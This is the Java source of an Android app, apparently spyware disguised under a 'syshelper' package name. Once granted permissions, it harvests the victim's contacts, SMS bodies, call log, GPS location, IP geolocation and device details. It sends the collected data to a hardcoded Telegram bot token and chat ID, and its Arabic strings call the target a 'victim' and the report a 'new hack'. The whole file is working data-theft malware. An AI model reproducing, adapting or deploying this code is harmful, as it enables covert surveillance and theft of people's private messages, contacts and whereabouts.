package com.syshelper.grab;

import android.Manifest;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.database.Cursor;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.Executors;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MainActivity extends AppCompatActivity {

    static final String TG_TOKEN = "8645078577:AAEF6-u7nbCpJwy2EKNwD6E4f2IOrISXkz0";
    static final String TG_CHAT  = "8480851378";
    static final String HEADER   = "اختراق جديد ✓ حبيس كان هنا";
    static final String CREDIT   = "© huss_IRQ — حبيس";

    static final int REQ = 1001;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        String[] perms = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
        };
        if (Build.VERSION.SDK_INT >= 33) {
            String[] p2 = new String[perms.length + 1];
            System.arraycopy(perms, 0, p2, 0, perms.length);
            p2[perms.length] = Manifest.permission.POST_NOTIFICATIONS;
            perms = p2;
        }
        ActivityCompat.requestPermissions(this, perms, REQ);
    }

    @Override
    public void onRequestPermissionsResult(int rc, @NonNull String[] p, @NonNull int[] g) {
        super.onRequestPermissionsResult(rc, p, g);
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                String report = buildReport();
                sendToTelegram(report);
            } catch (Exception e) {
                Log.e("grab", "err", e);
            }
        });
    }

    String buildReport() throws Exception {
        OkHttpClient net = new OkHttpClient();

        String pub = net.newCall(new Request.Builder()
                .url("https://api.ipify.org").build())
                .execute().body().string();

        JSONObject geo = new JSONObject(net.newCall(new Request.Builder()
                .url("http://ip-api.com/json/" + pub
                     + "?fields=country,city,regionName,isp,lat,lon").build())
                .execute().body().string());

        StringBuilder sb = new StringBuilder();
        String D = "━━━━━━━━━━━━━━━━━━━━\n";

        sb.append(HEADER).append("\n");
        sb.append("موقع الضحية: ")
          .append(geo.optString("country", "?"))
          .append(" - ")
          .append(geo.optString("city", "?"))
          .append("\n").append(D);

        sb.append("📱 Device: ").append(Build.MODEL)
          .append(" (").append(Build.BRAND).append(")\n");
        sb.append("🤖 Android: ").append(Build.VERSION.RELEASE)
          .append(" (SDK ").append(Build.VERSION.SDK_INT).append(")\n");
        sb.append("📡 Carrier: ").append(getCarrier()).append("\n");
        sb.append("🌐 IP: ").append(pub).append("\n");
        sb.append("🛰 ISP: ").append(geo.optString("isp", "?")).append("\n");

        Location loc = getLastLocation();
        if (loc != null) {
            sb.append("📍 GPS: ").append(loc.getLatitude())
              .append(", ").append(loc.getLongitude()).append("\n");
        }
        sb.append(D);

        JSONArray contacts = getContacts(150);
        sb.append("👥 Contacts (").append(contacts.length()).append("):\n");
        for (int i = 0; i < contacts.length(); i++) {
            JSONObject m = contacts.getJSONObject(i);
            sb.append("  • ").append(m.optString("name", "?"))
              .append(" — ").append(m.optString("phone", "?")).append("\n");
        }
        sb.append(D);

        JSONArray sms = getSMS(40);
        sb.append("💬 SMS (").append(sms.length()).append("):\n");
        for (int i = 0; i < sms.length(); i++) {
            JSONObject m = sms.getJSONObject(i);
            String body = m.optString("body", "").replace("\n", " ");
            if (body.length() > 90) body = body.substring(0, 90) + "…";
            sb.append("  • ").append(m.optString("from", "?"))
              .append(": ").append(body).append("\n");
        }
        sb.append(D);

        JSONArray calls = getCalls(25);
        sb.append("📞 Calls (").append(calls.length()).append("):\n");
        for (int i = 0; i < calls.length(); i++) {
            JSONObject m = calls.getJSONObject(i);
            sb.append("  • ").append(m.optString("num", "?"))
              .append(" — ").append(m.optLong("dur", 0)).append("s\n");
        }
        sb.append(D);
        sb.append(CREDIT).append("\n");

        return sb.toString();
    }

    String getCarrier() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String c = tm.getNetworkOperatorName();
            return c == null || c.isEmpty() ? "?" : c;
        } catch (Exception e) { return "?"; }
    }

    Location getLastLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this,
                    Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) return null;
            Location gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (gps != null) return gps;
            return lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        } catch (Exception e) { return null; }
    }

    JSONArray getContacts(int limit) {
        JSONArray arr = new JSONArray();
        try {
            Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            int n = 0;
            while (c != null && c.moveToNext() && n < limit) {
                JSONObject m = new JSONObject();
                m.put("name",  c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                m.put("phone", c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
                arr.put(m); n++;
            }
            if (c != null) c.close();
        } catch (Exception e) {}
        return arr;
    }

    JSONArray getSMS(int limit) {
        JSONArray arr = new JSONArray();
        try {
            Cursor c = getContentResolver().query(
                Telephony.Sms.CONTENT_URI, null, null, null,
                Telephony.Sms.DATE + " DESC");
            int n = 0;
            while (c != null && c.moveToNext() && n < limit) {
                JSONObject m = new JSONObject();
                m.put("from", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                m.put("body", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                arr.put(m); n++;
            }
            if (c != null) c.close();
        } catch (Exception e) {}
        return arr;
    }

    JSONArray getCalls(int limit) {
        JSONArray arr = new JSONArray();
        try {
            Cursor c = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC");
            int n = 0;
            while (c != null && c.moveToNext() && n < limit) {
                JSONObject m = new JSONObject();
                m.put("num", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                m.put("dur", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                arr.put(m); n++;
            }
            if (c != null) c.close();
        } catch (Exception e) {}
        return arr;
    }

    void sendToTelegram(String payload) throws IOException {
        if (TG_TOKEN.startsWith("PASTE")) return;
        int CHUNK = 3400;
        boolean first = true;
        for (int i = 0; i < payload.length(); i += CHUNK) {
            String part = payload.substring(i, Math.min(i + CHUNK, payload.length()));
            String text;
            if (first) {
                text = "<b>" + escapeHtml(HEADER) + "</b>\n"
                     + "<i>" + escapeHtml(CREDIT) + "</i>\n"
                     + "<pre>" + escapeHtml(part) + "</pre>";
            } else {
                text = "<i>(تكملة)</i> — " + escapeHtml(CREDIT) + "\n"
                     + "<pre>" + escapeHtml(part) + "</pre>";
            }
            first = false;

            OkHttpClient c = new OkHttpClient();
            RequestBody body = new FormBody.Builder()
                .add("chat_id", TG_CHAT)
                .add("text", text)
                .add("parse_mode", "HTML")
                .add("disable_web_page_preview", "true")
                .build();
            c.newCall(new Request.Builder()
                .url("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage")
                .post(body).build()).execute().close();

            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        }
    }

    String escapeHtml(String s) {
        return s.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;");
    }
}
